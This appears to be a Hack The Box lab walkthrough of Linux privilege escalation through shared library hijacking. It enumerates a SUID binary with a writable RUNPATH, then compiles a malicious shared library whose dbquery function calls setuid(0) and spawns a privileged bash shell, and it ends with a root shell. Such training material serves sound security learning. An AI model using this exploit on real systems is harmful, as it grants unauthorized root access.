# Shared Library Hijacking

## SUID Binary

```sh
htb-student@NIX02:~$ ls -l payroll
```

```output title="Output"
-rwsr-xr-x 1 root root 16728 Sep  1  2020 payroll
```

## Required Libraries

```sh
htb-student@NIX02:~$ ldd payroll
```

```output title="Output" hl_lines="2"
linux-vdso.so.1 (0x00007fffc1f29000)
libshared.so => /development/libshared.so (0x00007f91bc147000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f91bbd56000)
/lib64/ld-linux-x86-64.so.2 (0x00007f91bc349000)
```

## RUNPATH

```sh
htb-student@NIX02:~$ readelf -d payroll | grep RUNPATH
```

```output title="Output"
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

## World Writable

```sh
htb-student@NIX02:~$ ls -ld /development
```

```output title="Output"
drwxrwxrwx 2 root root 4096 Sep  1  2020 /development
```

## Finding Function Name

### Library Overwrite

```sh
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

### Error

```sh
htb-student@NIX02:~$ ./payroll
```

```output title="Output"
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

## Malicious Code

```c title="libshared.c" linenums="1" hl_lines="4"
#include <stdlib.h>
#include <unistd.h>

void dbquery()
{
    setuid(0);
    system("/bin/bash -p");
}
```

## Compilation

```sh
htb-student@NIX02:~$ gcc -shared -o /development/libshared.so libshared.c -fPIC
```

## Privileged Shell

```sh
htb-student@NIX02:~$ ./payroll
root@NIX02:~# id
```

```output title="Output"
uid=0(root) gid=1008(htb-student) groups=1008(htb-student)
```
